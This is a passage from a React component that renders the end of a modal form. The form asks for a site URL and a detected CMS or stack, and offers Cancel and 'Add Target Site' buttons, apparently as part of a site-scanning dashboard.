                  value={newSiteUrl}
                  onChange={(e) => setNewSiteUrl(e.target.value)}
                  className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg p-2.5 text-xs text-white font-mono"
                />
              </div>

              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-1">Detected CMS / Stack</label>
                <input 
                  type="text" 
                  placeholder="WordPress 6.4.2" 
                  value={newSiteCms}
                  onChange={(e) => setNewSiteCms(e.target.value)}
                  className="w-full bg-[#1e293b]/60 border border-slate-700 rounded-lg p-2.5 text-xs text-white"
                />
              </div>

              <div className="flex justify-end gap-2 pt-2">
                <button 
                  type="button" 
                  onClick={() => setIsAddSiteOpen(false)} 
                  className="px-4 py-2 bg-slate-800 text-slate-300 text-xs font-semibold rounded-lg hover:bg-slate-700"
                >
                  Cancel
                </button>
                <button 
                  type="submit" 
                  className="px-4 py-2 bg-blue-600 text-white text-xs font-semibold rounded-lg hover:bg-blue-500"
                >
                  Add Target Site
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

    </div>
  );
}